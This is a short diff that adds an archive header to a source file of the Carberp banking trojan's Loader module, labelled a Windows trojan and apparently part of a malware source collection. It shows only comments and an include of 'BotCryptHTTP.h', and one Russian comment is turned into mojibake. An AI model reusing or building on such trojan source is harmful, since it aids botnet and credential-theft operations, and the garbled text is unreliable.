@@ -1,7 +1,18 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 /*--------------------------------------------------------------------------*/
 //
-//  Модули сборки Loader.
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Loader.
 //
 /*--------------------------------------------------------------------------*/
 #include "BotCryptHTTP.h"
